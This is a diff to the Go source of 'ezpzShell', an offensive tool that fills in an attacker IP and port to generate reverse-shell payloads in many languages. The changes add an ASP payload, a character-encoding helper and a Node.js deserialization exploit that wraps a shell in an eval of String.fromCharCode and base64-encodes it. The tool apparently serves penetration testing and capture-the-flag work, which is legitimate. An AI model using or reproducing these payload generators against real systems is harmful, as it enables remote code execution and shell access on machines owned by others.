@@ -10,6 +10,8 @@ import (
 	b64 "encoding/base64"
 	"log"
 	"io"
+	"strconv"
+	
 )
 
 //Color Variable
@@ -63,7 +65,7 @@ func header(){
 `
 	fmt.Println(header)
 	fmt.Print(string(colorCyan),"[Payload Available]",string(colorReset))
-	fmt.Print("\npy,py3,bash,c,nc,php,perl,ruby,haskell,powershell,nodejs,awk,ncat,exe,ssti,cgibin,jenkins,tarpriv,java,lua")
+	fmt.Print("\npy,py3,bash,c,nc,php,perl,ruby,haskell,powershell,nodejs,awk,ncat,exe,ssti,cgibin,jenkins,tarpriv,java,lua,asp")
 	
 	fmt.Print("\n\n",string(colorCyan),"[Usage]",string(colorReset),"\n")
 	fmt.Print(string(colorOrange),"ezpzShell 10.10.10.10 9001 py",string(colorReset),"\n")
@@ -115,11 +117,10 @@ func loadShell(mapPayload map[string][]string, sliceData []string) {
 			mapPayload["java"] = append(mapPayload["java"],data)
 		}else if i == 20{
 			mapPayload["lua"] = append(mapPayload["lua"],data)
+		}else if i == 21{
+			mapPayload["asp"] = append(mapPayload["asp"],data)
 		}
 	}
-	//for key, _ := range mapPayload {
-	//    	fmt.Println("Key:", key)
-	//}
 	return
 }
 
@@ -129,6 +130,16 @@ func base64gen(ip string, port string) string{
 	encodeB64 := b64.StdEncoding.EncodeToString([]byte(temp))
 	return encodeB64
 	
+}
+
+//Function CharEncode
+func charencode(payload string) string{
+	fmt.Print("\n")
+	temp := ""
+	for i := 0; i < len(payload); i++ {
+	    temp = temp + "," + strconv.Itoa(int(payload[i]))
+	}
+	return temp[1:]
 }
 
 //Function Listen Connection
@@ -159,7 +170,7 @@ func main(){
 	}
 	mapPayload := map[string][]string{}
 	//FilePath
-	filename := "/opt/OtherTools/EazyH0j3n/EzpzShell/shell.txt"
+	filename := "/opt/OtherTools/H0j3n/EzpzShell/shell.txt"
 	//Regex For Ip Address
 	re := regexp.MustCompile(`(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}`)
 	
@@ -199,6 +210,11 @@ func main(){
 			fmt.Print("\n",strings.TrimSpace(strings.Replace(data,"{BASE64}",base64gen(ip,port),1)))
 		}else if strings.Contains(data, "{PICKLE}"){
 			fmt.Println("\nNot at the moment please use python version!")
+		}else if strings.Contains(data, "{NODEJS_DESERIALIZATION}"){
+			payloadN := charencode(strings.TrimSpace(strings.Replace(strings.Replace(strings.Replace(data,"{NODEJS_DESERIALIZATION}","",1),"{IP}",ip,1),"{PORT}",port,1)))
+			s := fmt.Sprintf("\n{\"run\": \"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()\"}",payloadN)
+			fmt.Print(s)
+			fmt.Print("\n\n",b64.StdEncoding.EncodeToString([]byte(s)))
 		}else{
 			fmt.Print("\n",strings.TrimSpace(strings.Replace(strings.Replace(data,"{IP}",ip,1),"{PORT}",port,1)))
 		}
